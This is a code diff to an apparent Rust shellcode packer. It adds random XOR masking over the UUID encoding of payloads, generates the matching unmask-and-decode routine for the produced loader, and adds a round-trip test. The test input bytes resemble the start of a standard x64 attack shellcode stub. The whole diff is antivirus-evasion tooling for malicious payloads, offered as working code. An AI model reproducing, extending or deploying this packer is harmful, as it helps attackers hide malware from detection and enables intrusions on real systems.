@@ -1,6 +1,15 @@
 use crate::shellcode_reader::read_shellcode;
-use crate::tools::{write_to_file, EncryptionOutput};
+use crate::tools::{random_u8, write_to_file, EncryptionOutput};
 use std::path::Path;
+
+fn random_xor_key() -> u8 {
+    loop {
+        let k = random_u8();
+        if k != 0 {
+            return k;
+        }
+    }
+}
 
 fn bytes_to_uuid(chunk: &[u8; 16]) -> String {
     format!(
@@ -35,9 +44,17 @@ pub fn encrypt_uuid(input_path: &Path, export_path: &Path) -> EncryptionOutput {
     let unencrypted = read_shellcode(input_path);
     let original_len = unencrypted.len();
     let encoded = uuid_encode(&unencrypted);
-    write_to_file(encoded.as_bytes(), export_path).expect("Failed to write UUID output");
 
-    let decryption_function = "fn hex_to_byte(h: u8, l: u8) -> u8 {
+    let xor_key = random_xor_key();
+    let masked: Vec<u8> = encoded.bytes().map(|b| b ^ xor_key).collect();
+    write_to_file(&masked, export_path).expect("Failed to write UUID output");
+
+    let decryption_function = "fn unmask(buf: &mut Vec<u8>, key: u8) {
+        for b in buf.iter_mut() {
+            *b ^= key;
+        }
+    }
+    fn hex_to_byte(h: u8, l: u8) -> u8 {
         fn val(c: u8) -> u8 {
             match c {
                 b'0'..=b'9' => c - b'0',
@@ -67,7 +84,10 @@ pub fn encrypt_uuid(input_path: &Path, export_path: &Path) -> EncryptionOutput {
     }"
     .to_string();
 
-    let main = format!("vec = uuid_decode(&vec);\n    vec.truncate({});", original_len);
+    let main = format!(
+        "unmask(&mut vec, 0x{:02x});\n    vec = uuid_decode(&vec);\n    vec.truncate({});",
+        xor_key, original_len
+    );
 
     println!("[+] Done UUID encoding shellcode!");
     EncryptionOutput {
@@ -169,5 +189,66 @@ mod tests {
         let original: Vec<u8> = (0..48).collect();
         let encoded = uuid_encode(&original);
         assert_eq!(encoded.lines().count(), 3);
+    }
+
+    #[test]
+    fn test_encrypt_uuid_xor_roundtrip() {
+        let dir = std::env::temp_dir().join("rustpacker_test_uuid_xor");
+        std::fs::create_dir_all(&dir).unwrap();
+        let input_path = dir.join("input.bin");
+        let output_path = dir.join("output.uuid");
+
+        let original: Vec<u8> = vec![
+            0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00,
+            0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
+            0x56, 0x48, 0x31, 0xd2, 0x65,
+        ];
+        std::fs::write(&input_path, &original).unwrap();
+
+        let output = encrypt_uuid(&input_path, &output_path);
+
+        let mut encoded = std::fs::read(&output_path).unwrap();
+
+        let key_hex = &output.main[output.main.find("0x").unwrap() + 2..];
+        let xor_key = u8::from_str_radix(&key_hex[..2], 16).unwrap();
+
+        for b in encoded.iter_mut() {
+            *b ^= xor_key;
+        }
+
+        fn hex_to_byte(h: u8, l: u8) -> u8 {
+            fn val(c: u8) -> u8 {
+                match c {
+                    b'0'..=b'9' => c - b'0',
+                    b'a'..=b'f' => c - b'a' + 10,
+                    b'A'..=b'F' => c - b'A' + 10,
+                    _ => 0,
+                }
+            }
+            (val(h) << 4) | val(l)
+        }
+        fn uuid_decode(buf: &[u8]) -> Vec<u8> {
+            let mut result = Vec::new();
+            let mut i = 0;
+            while i < buf.len() {
+                if buf[i] == b'-' || buf[i] == b'\n' || buf[i] == b'\r' {
+                    i += 1;
+                    continue;
+                }
+                if i + 1 < buf.len() {
+                    result.push(hex_to_byte(buf[i], buf[i + 1]));
+                    i += 2;
+                } else {
+                    break;
+                }
+            }
+            result
+        }
+
+        let mut decoded = uuid_decode(&encoded);
+        decoded.truncate(original.len());
+        assert_eq!(decoded, original);
+
+        std::fs::remove_dir_all(&dir).unwrap();
     }
 }
